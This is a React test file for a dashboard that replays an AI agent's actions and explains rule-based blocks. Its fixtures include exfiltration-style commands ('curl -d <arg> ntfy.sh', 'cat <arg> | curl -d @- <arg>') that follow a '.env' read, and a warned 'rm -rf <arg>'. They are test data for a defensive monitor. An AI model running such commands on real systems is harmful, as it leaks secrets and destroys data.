import { act, cleanup, fireEvent, render, screen, within } from '@testing-library/react'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import App from '../App'
import { makeStep } from '../graph/testing'
import type { Step } from '../graph/types'
import { CARD_PREFS_KEY } from './cardPrefs'
import { TrailView } from './TrailView'

async function advance(ms: number): Promise<void> {
  await act(async () => {
    await vi.advanceTimersByTimeAsync(ms)
  })
}

const read = (order: number, file: string, over: Partial<Step> = {}): Step =>
  makeStep(order, { kind: 'read', file, command: null, ...over })
const block = (order: number, over: Partial<Step> = {}): Step =>
  makeStep(order, { verdict: 'blocked', rule: 'R1', host: 'ntfy.sh', command: 'curl -d <arg> ntfy.sh', ...over })

/** README, a `.env` read (marks the session), routine steps, then R1 blocks. */
const STORY: Step[] = [
  read(1, 'README.md'),
  read(2, '.env', { sensitive: true }),
  makeStep(3),
  makeStep(4),
  block(5),
  makeStep(6),
  block(7),
  makeStep(8, { verdict: 'warned', rule: 'R2', command: 'rm -rf <arg>' }),
]

interface Server {
  steps: Step[]
  session: string | null
  marker: Record<string, unknown>
  markerSession: string | null
  health: unknown
  fail: boolean
}

function server(over: Partial<Server> = {}): Server {
  return { steps: STORY, session: 's', marker: { marked_order: 2 }, markerSession: 's', health: { ok: true }, fail: false, ...over }
}

function stubFetch(s: Server) {
  const fn = vi.fn(async (url: string) => {
    if (s.fail) throw new Error('down')
    if (url === '/health') return { ok: true, json: async () => s.health } as Response
    if (url.includes('limit=1')) return { ok: true, json: async () => ({ session: s.markerSession, steps: [], ...s.marker }) } as Response
    return { ok: true, json: async () => ({ session: s.session, steps: s.steps }) } as Response
  })
  vi.stubGlobal('fetch', fn)
  return fn
}

function renderReal() {
  return render(<TrailView mock={false} len={500} burst={1} rich={false} />)
}

/** textContent with the non-breaking spaces of 'Step 7' turned into plain spaces. */
const txt = (el: Element): string => (el.textContent ?? '').replace(/\u00a0/g, ' ')
const why = () => screen.getByRole('complementary', { name: 'Why card' })

const rows = () => [...document.querySelectorAll<HTMLElement>('.tr-row[data-order]')]
const row = (order: number) => document.querySelector<HTMLElement>(`.tr-row[data-order="${order}"]`)!

beforeEach(() => {
  vi.useFakeTimers()
  window.localStorage.clear()
  window.history.replaceState({}, '', '/')
})

afterEach(() => {
  cleanup()
  vi.useRealTimers()
  vi.unstubAllGlobals()
})

describe('data: two requests per poll', () => {
  it('reads all steps, the marking step and /health, then draws the rail from the marker to the selected block', async () => {
    const fetchFn = stubFetch(server())
    renderReal()
    await advance(0)
    const urls = fetchFn.mock.calls.map((c) => c[0])
    expect(urls).toContain('/api/steps?all=1')
    expect(urls).toContain('/api/steps?limit=1')
    expect(urls).toContain('/health')
    const rail = document.querySelector('.tr-rail')!
    expect(rail.getAttribute('data-from')).toBe('2')
    expect(rail.getAttribute('data-to')).toBe('7')
  })

  it('draws no rail and says the trigger is not known when the recorder sends no marker', async () => {
    stubFetch(server({ marker: { marked_order: null } }))
    renderReal()
    await advance(0)
    expect(document.querySelector('.tr-rail')).toBeNull()
    expect(screen.getByText(/not known: the recorder did not report it/)).toBeTruthy()
  })

  it('ignores a marker from another session', async () => {
    stubFetch(server({ markerSession: 'other' }))
    renderReal()
    await advance(0)
    expect(document.querySelector('.tr-rail')).toBeNull()
  })

  it('never guesses the trigger from a sensitive step', async () => {
    stubFetch(server({ marker: { marked_order: null } }))
    renderReal()
    await advance(0)
    expect(document.querySelector('.tr-row.trigger')).toBeNull()
  })

  it('keeps the steps and shows OFFLINE when the recorder stops, then recovers', async () => {
    const s = server()
    stubFetch(s)
    renderReal()
    await advance(0)
    s.fail = true
    await advance(1000)
    expect(screen.getByRole('alert').textContent).toContain('OFFLINE')
    expect(rows().length).toBeGreaterThan(0)
    s.fail = false
    await advance(1000)
    expect(screen.queryByRole('alert')).toBeNull()
  })
})

describe('polls that bring nothing new', () => {
  it('leave the rows alone, but still take a changed marker', async () => {
    const s = server({ marker: { marked_order: null } })
    stubFetch(s)
    renderReal()
    await advance(0)
    const before = row(7)
    expect(document.querySelector('.tr-rail')).toBeNull()
    s.steps = STORY.map((st) => ({ ...st }))
    await advance(1000)
    expect(row(7)).toBe(before)
    s.marker = { marked_order: 2 }
    await advance(1000)
    expect(document.querySelector('.tr-rail')!.getAttribute('data-from')).toBe('2')
  })

  it('still leave "Connecting" for an empty session', async () => {
    stubFetch(server({ steps: [], session: null }))
    renderReal()
    expect(screen.getByText('Connecting to the recorder…')).toBeTruthy()
    await advance(0)
    expect(screen.getByText('Waiting for agent actions…')).toBeTruthy()
    await advance(1000)
    expect(screen.getByText('Waiting for agent actions…')).toBeTruthy()
  })
})

describe('health strip', () => {
  it('hides the last hook time and the offline-guard count when /health sends only ok', async () => {
    stubFetch(server())
    renderReal()
    await advance(0)
    expect(screen.getByText('Recorder up')).toBeTruthy()
    expect(document.body.textContent).not.toMatch(/last hook|offline guard/)
  })

  it('shows them when /health sends them', async () => {
    stubFetch(server({ health: { ok: true, last_hook_at: '2026-10-16T09:30:05Z', offline_guard_count: 3 } }))
    renderReal()
    await advance(0)
    expect(document.body.textContent).toMatch(/last hook/)
    expect(document.body.textContent).toMatch(/offline guard 3/)
  })

  it('ignores a malformed time and a negative count', async () => {
    stubFetch(server({ health: { ok: true, last_hook_at: 'yesterday', offline_guard_count: -1 } }))
    renderReal()
    await advance(0)
    expect(document.body.textContent).not.toMatch(/last hook|offline guard/)
  })
})

describe('the trail on a 500-step mock session', () => {
  beforeEach(() => {
    render(<TrailView mock len={500} burst={500} rich={false} />)
  })

  it('gives every step a row and every row a verdict', () => {
    expect(rows()).toHaveLength(500)
    for (const el of rows()) {
      const verdict = el.getAttribute('data-verdict') ?? 'allowed'
      if (verdict === 'allowed') expect(el.textContent).toContain('allowed')
      else expect(el.textContent).toMatch(/Blocked|Warned|Highlight/)
    }
  })

  it('groups routine allowed steps, never blocks, warnings or the secret read', () => {
    const groups = document.querySelectorAll('.tr-group')
    expect(groups.length).toBeGreaterThan(20)
    for (const el of document.querySelectorAll('.tr-group .tr-row')) {
      expect(el.textContent).toContain('allowed')
      expect(el.textContent).not.toMatch(/Blocked|Warned|Secret/)
    }
    expect(document.querySelectorAll('.tr-row.alarm.b').length).toBe(38)
    expect(document.querySelectorAll('.tr-row.alarm.w').length).toBe(15)
    expect(document.querySelector('.tr-group .tr-row.secret')).toBeNull()
    expect(document.querySelectorAll('.tr-row.secret')).toHaveLength(1)
  })

  it('selects the newest block: only that row is pressed, the others stay tinted', () => {
    const pressed = document.querySelectorAll('.tr-row.alarm[aria-pressed="true"]')
    expect(pressed).toHaveLength(1)
    expect(pressed[0].getAttribute('data-order')).toBe('495')
    expect(document.querySelectorAll('.tr-row.alarm[aria-pressed="false"]').length).toBeGreaterThan(40)
  })

  it('runs the rail from the secret read to the selected block', () => {
    const rail = document.querySelector('.tr-rail')!
    expect(rail.getAttribute('data-from')).toBe('2')
    expect(rail.getAttribute('data-to')).toBe('495')
    expect(row(2).classList.contains('trigger')).toBe(true)
  })

  it('opens the Why card of a block someone picks, and stops following', () => {
    const follow = screen.getByRole('button', { name: 'Follow latest' })
    expect(follow.getAttribute('aria-pressed')).toBe('true')
    fireEvent.click(row(14))
    expect(row(14).getAttribute('aria-pressed')).toBe('true')
    expect(follow.getAttribute('aria-pressed')).toBe('false')
    expect(txt(why())).toContain('Step 14')
    expect(document.querySelector('.tr-rail')!.getAttribute('data-to')).toBe('14')
  })

  it('moves between blocks with Next, Prev and the n / p keys', () => {
    fireEvent.click(row(14))
    fireEvent.keyDown(document, { key: 'n' })
    expect(document.querySelector('.tr-row.alarm[aria-pressed="true"]')!.getAttribute('data-order')).toBe('27')
    fireEvent.keyDown(document, { key: 'p' })
    fireEvent.keyDown(document, { key: 'p' })
    expect(document.querySelector('.tr-row.alarm[aria-pressed="true"]')!.getAttribute('data-order')).toBe('14')
  })
})

describe('Follow', () => {
  it('scrolls to the newest step on each poll and turns off when the owner scrolls up', async () => {
    const s = server()
    stubFetch(s)
    const heights = vi.spyOn(Element.prototype, 'scrollHeight', 'get').mockReturnValue(900)
    vi.spyOn(Element.prototype, 'clientHeight', 'get').mockReturnValue(300)
    renderReal()
    await advance(0)
    const list = document.querySelector<HTMLElement>('.tr-list')!
    expect(list.scrollTop).toBe(900)
    heights.mockReturnValue(1200)
    s.steps = [...STORY, makeStep(9)]
    await advance(1000)
    expect(list.scrollTop).toBe(1200)
    list.scrollTop = 100
    fireEvent.scroll(list)
    expect(screen.getByRole('button', { name: 'Follow latest' }).getAttribute('aria-pressed')).toBe('false')
    vi.restoreAllMocks()
  })

  it('selects a new block as it arrives while following, and keeps a picked one otherwise', async () => {
    const s = server()
    stubFetch(s)
    renderReal()
    await advance(0)
    expect(row(7).getAttribute('aria-pressed')).toBe('true')
    s.steps = [...STORY, makeStep(9), block(10)]
    await advance(1000)
    expect(row(10).getAttribute('aria-pressed')).toBe('true')
    fireEvent.click(row(5))
    s.steps = [...s.steps, block(11)]
    await advance(1000)
    expect(row(5).getAttribute('aria-pressed')).toBe('true')
    expect(row(11).getAttribute('aria-pressed')).toBe('false')
  })
})

describe('the Why card', () => {
  it('shows the rule, the chain, the rules commands and no allow button', async () => {
    stubFetch(server())
    renderReal()
    await advance(0)
    const card = screen.getByRole('complementary', { name: 'Why card' })
    expect(txt(card)).toContain('Step 2 read .env')
    expect(txt(card)).toContain('Step 7 tried curl -d <arg> ntfy.sh → R1')
    expect(txt(card)).toContain('severity block')
    expect(within(card).getByText('ntfy.sh')).toBeTruthy()
    expect(card.querySelectorAll('.tr-dash line')).toHaveLength(2)
    expect(txt(card)).toContain('agentfly rules draft')
    expect(txt(card)).toContain('sudo agentfly rules apply <draft>')
    expect(within(card).queryByRole('button', { name: /allow/i })).toBeNull()
    expect(txt(card)).toContain('Contents not recorded')
  })

  it('invents nothing when the step carries no rule text or messages', async () => {
    stubFetch(server())
    renderReal()
    await advance(0)
    const card = screen.getByRole('complementary', { name: 'Why card' })
    expect(txt(card)).toContain('did not send the rule text or the messages')
    expect(txt(card)).not.toContain('Messages sent')
  })

  it('shows the rule text and both messages when the step has them', async () => {
    stubFetch(server({ steps: STORY.map((st) => (st.order === 7 ? { ...st, rule_text: 'RT', user_message: 'UM', agent_message: 'AM' } : st)) }))
    renderReal()
    await advance(0)
    const card = screen.getByRole('complementary', { name: 'Why card' })
    expect(txt(card)).toContain('Messages sent')
    for (const t of ['RT', 'UM', 'AM']) expect(within(card).getByText(t)).toBeTruthy()
  })

  it('opens for a warning with no trigger step, no invented chain', async () => {
    stubFetch(server())
    renderReal()
    await advance(0)
    fireEvent.click(row(8))
    const card = screen.getByRole('complementary', { name: 'Why card' })
    expect(txt(card)).toContain('Step 8 ran rm -rf <arg> → R2 warning')
    expect(card.querySelector('.tr-box.sec')).toBeNull()
    expect(card.querySelector('.tr-box.wrn')).toBeTruthy()
  })

  it('draws a dashed line to the rule only when the step has no host', async () => {
    stubFetch(server())
    renderReal()
    await advance(0)
    fireEvent.click(row(8))
    expect(document.querySelectorAll('.tr-dash line')).toHaveLength(1)
    expect(document.querySelector('.tr-host')).toBeNull()
  })

  it('says so, and shows no rule, when the step has no rule id', async () => {
    stubFetch(server({ steps: [read(1, 'a'), block(2, { rule: null, host: null })] }))
    renderReal()
    await advance(0)
    const card = screen.getByRole('complementary', { name: 'Why card' })
    expect(txt(card)).toContain('rule not recorded')
    expect(document.querySelector('.tr-pill')).toBeNull()
  })

  it('has an empty state before anything is blocked', async () => {
    stubFetch(server({ steps: [read(1, 'a')] }))
    renderReal()
    await advance(0)
    expect(screen.getByText('No blocks or warnings yet')).toBeTruthy()
  })

  it('shows a highlighted step with its own badge and a card', async () => {
    stubFetch(server({ steps: [...STORY, makeStep(9, { verdict: 'highlighted', rule: 'H1' })] }))
    renderReal()
    await advance(0)
    expect(row(9).textContent).toContain('Highlight · H1')
    fireEvent.click(row(9))
    expect(txt(why())).toContain('severity highlight')
  })
})

describe('selection', () => {
  it('forgets a pick when the session changes (orders start again at 1)', async () => {
    const s = server()
    stubFetch(s)
    renderReal()
    await advance(0)
    fireEvent.click(row(5))
    expect(row(5).getAttribute('aria-pressed')).toBe('true')
    s.session = 'other'
    s.markerSession = 'other'
    s.steps = [makeStep(1), block(5), makeStep(6), block(9)]
    await advance(1000)
    expect(row(9).getAttribute('aria-pressed')).toBe('true')
    expect(row(5).getAttribute('aria-pressed')).toBe('false')
    expect(screen.queryByText(/no longer in the last/)).toBeNull()
    expect(screen.getByRole('button', { name: 'Follow latest' }).getAttribute('aria-pressed')).toBe('true')
  })

  it('freezes the card on the block it shows when Follow is turned off, so new blocks do not move it', async () => {
    const s = server()
    stubFetch(s)
    renderReal()
    await advance(0)
    fireEvent.click(screen.getByRole('button', { name: 'Follow latest' }))
    s.steps = [...STORY, makeStep(9), block(10)]
    await advance(1000)
    expect(row(7).getAttribute('aria-pressed')).toBe('true')
    expect(row(10).getAttribute('aria-pressed')).toBe('false')
    fireEvent.click(screen.getByRole('button', { name: 'Follow latest' }))
    expect(row(10).getAttribute('aria-pressed')).toBe('true')
  })

  it('freezes it when the owner scrolls up, too', async () => {
    const s = server()
    stubFetch(s)
    vi.spyOn(Element.prototype, 'scrollHeight', 'get').mockReturnValue(900)
    vi.spyOn(Element.prototype, 'clientHeight', 'get').mockReturnValue(300)
    renderReal()
    await advance(0)
    const list = document.querySelector<HTMLElement>('.tr-list')!
    list.scrollTop = 100
    fireEvent.scroll(list)
    s.steps = [...STORY, makeStep(9), block(10)]
    await advance(1000)
    expect(row(7).getAttribute('aria-pressed')).toBe('true')
    vi.restoreAllMocks()
  })
})

describe('a block that marked the session itself', () => {
  it('says so instead of "not known" when marked_order is the blocked step', async () => {
    stubFetch(server({ steps: [read(1, 'a'), block(2, { command: 'cat <arg> | curl -d @- <arg>' })], marker: { marked_order: 2 } }))
    renderReal()
    await advance(0)
    expect(screen.getByText(/marked the session and was blocked in the same action/)).toBeTruthy()
    expect(document.body.textContent).not.toMatch(/did not report it/)
    expect(document.querySelector('.tr-rail')).toBeNull()
  })
})

describe('the 500-step cap', () => {
  it('says the marking step is older than the last 500 steps when it has dropped out', () => {
    render(<TrailView mock len={600} burst={600} rich={false} />)
    expect(rows()).toHaveLength(500)
    expect(row(101)).toBeTruthy()
    expect(document.querySelector('.tr-rail')).toBeNull()
    expect(screen.getByText(/is older than the last 500 steps/)).toBeTruthy()
  })

  it('falls back to the newest block, with a note, when the picked block drops out', async () => {
    const s = server({ steps: Array.from({ length: 6 }, (_, i) => (i === 2 ? block(3) : makeStep(i + 1))) })
    stubFetch(s)
    renderReal()
    await advance(0)
    fireEvent.click(row(3))
    s.steps = [makeStep(4), makeStep(5), block(6)]
    await advance(1000)
    expect(row(6).getAttribute('aria-pressed')).toBe('true')
    expect(screen.getByText(/The step you picked is no longer in the last 500 steps/)).toBeTruthy()
  })
})

describe('hiding and resizing the Why card', () => {
  const card = () => screen.queryByRole('complementary', { name: 'Why card' })

  it('hides to a bar that names the rule and step, and shows again', async () => {
    stubFetch(server())
    renderReal()
    await advance(0)
    fireEvent.click(screen.getByRole('button', { name: /Hide the Why card/ }))
    expect(card()).toBeNull()
    const bar = screen.getByRole('button', { name: /Show the Why card/ })
    expect(bar.textContent).toContain('Why card · R1 · Step 7')
    fireEvent.click(bar)
    expect(card()).not.toBeNull()
  })

  it('toggles with the w key, but not while typing', async () => {
    stubFetch(server())
    renderReal()
    await advance(0)
    fireEvent.keyDown(document, { key: 'w' })
    expect(card()).toBeNull()
    fireEvent.keyDown(document, { key: 'w' })
    expect(card()).not.toBeNull()
    const input = document.body.appendChild(document.createElement('input'))
    fireEvent.keyDown(input, { key: 'w' })
    expect(card()).not.toBeNull()
    input.remove()
  })

  it('remembers hidden between visits', async () => {
    stubFetch(server())
    const first = renderReal()
    await advance(0)
    fireEvent.click(screen.getByRole('button', { name: /Hide the Why card/ }))
    expect(JSON.parse(window.localStorage.getItem(CARD_PREFS_KEY)!).hidden).toBe(true)
    first.unmount()
    renderReal()
    await advance(0)
    expect(card()).toBeNull()
  })

  it('keeps the card hidden when another block is picked, and updates the bar', async () => {
    stubFetch(server())
    renderReal()
    await advance(0)
    fireEvent.click(screen.getByRole('button', { name: /Hide the Why card/ }))
    fireEvent.click(row(5))
    expect(card()).toBeNull()
    expect(screen.getByRole('button', { name: /Show the Why card/ }).textContent).toContain('Step 5')
  })

  it('works when storage is blocked', async () => {
    vi.spyOn(Storage.prototype, 'getItem').mockImplementation(() => {
      throw new Error('blocked')
    })
    vi.spyOn(Storage.prototype, 'setItem').mockImplementation(() => {
      throw new Error('blocked')
    })
    stubFetch(server())
    renderReal()
    await advance(0)
    fireEvent.click(screen.getByRole('button', { name: /Hide the Why card/ }))
    expect(card()).toBeNull()
    vi.restoreAllMocks()
  })

  describe('the splitter', () => {
    const splitter = () => screen.getByRole('separator', { name: 'Resize the Why card' })
    const saved = () => JSON.parse(window.localStorage.getItem(CARD_PREFS_KEY) ?? '{}')

    it('is a horizontal separator when stacked, with its limits', async () => {
      stubFetch(server())
      renderReal()
      await advance(0)
      expect(splitter().getAttribute('aria-orientation')).toBe('horizontal')
      expect(splitter().getAttribute('aria-valuemin')).toBe('160')
    })

    it('resizes with the arrow keys in 24 px steps and remembers the size', async () => {
      stubFetch(server())
      renderReal()
      await advance(0)
      const before = Number(splitter().getAttribute('aria-valuenow'))
      fireEvent.keyDown(splitter(), { key: 'ArrowDown' })
      expect(Number(splitter().getAttribute('aria-valuenow'))).toBe(before - 24)
      expect(saved().stacked).toBe(before - 24)
      fireEvent.keyDown(splitter(), { key: 'ArrowUp' })
      expect(Number(splitter().getAttribute('aria-valuenow'))).toBe(before)
    })

    it('never goes below the minimum', async () => {
      stubFetch(server())
      renderReal()
      await advance(0)
      for (let i = 0; i < 20; i++) fireEvent.keyDown(splitter(), { key: 'ArrowDown' })
      expect(splitter().getAttribute('aria-valuenow')).toBe('160')
    })

    it('saves nothing for a click without a drag', async () => {
      stubFetch(server())
      renderReal()
      await advance(0)
      fireEvent.pointerDown(splitter(), { clientY: 400, button: 0, pointerId: 1 })
      fireEvent.pointerUp(splitter(), { pointerId: 1 })
      expect(window.localStorage.getItem(CARD_PREFS_KEY)).toBeNull()
    })

    it('resizes by dragging (up grows the card) and saves on release only', async () => {
      stubFetch(server())
      renderReal()
      await advance(0)
      fireEvent.keyDown(splitter(), { key: 'ArrowDown' })
      const start = Number(splitter().getAttribute('aria-valuenow'))
      fireEvent.pointerDown(splitter(), { clientY: 400, button: 0, pointerId: 1 })
      fireEvent.pointerMove(splitter(), { clientY: 430, pointerId: 1 })
      expect(Number(splitter().getAttribute('aria-valuenow'))).toBe(start - 30)
      expect(saved().stacked).toBe(start)
      fireEvent.pointerUp(splitter(), { pointerId: 1 })
      expect(saved().stacked).toBe(start - 30)
    })

    it('goes back to the default on a double-click', async () => {
      stubFetch(server())
      renderReal()
      await advance(0)
      fireEvent.keyDown(splitter(), { key: 'ArrowDown' })
      fireEvent.doubleClick(splitter())
      expect(saved().stacked).toBeNull()
      expect(splitter().getAttribute('aria-valuenow')).toBe('280')
    })
  })
})

describe('layout and header', () => {
  it('marks the half-screen layout and keeps the header to one row of non-wrapping items', async () => {
    stubFetch(server())
    renderReal()
    await advance(0)
    expect(document.querySelector('.tr')!.getAttribute('data-layout')).toBe('stacked')
    expect(document.querySelectorAll('.tr-header > *').length).toBeLessThan(8)
  })

  it('shows the count and the Secret seen chip', async () => {
    stubFetch(server())
    renderReal()
    await advance(0)
    expect(screen.getByText('8 steps')).toBeTruthy()
    expect(screen.getByText('Secret seen')).toBeTruthy()
  })

  it('says the recorder is not reachable, not "waiting", when it never answered', async () => {
    stubFetch(server({ fail: true }))
    renderReal()
    await advance(0)
    expect(screen.getByText(/the recorder is not reachable/)).toBeTruthy()
  })
})

describe('routing', () => {
  it('shows the trail at ?view=trail and the lane graph otherwise', async () => {
    stubFetch(server())
    window.history.replaceState({}, '', '/?view=trail')
    const trail = render(<App />)
    await advance(0)
    expect(document.querySelector('.tr')).not.toBeNull()
    trail.unmount()
    window.history.replaceState({}, '', '/')
    render(<App />)
    await advance(0)
    expect(document.querySelector('.tr')).toBeNull()
  })
})
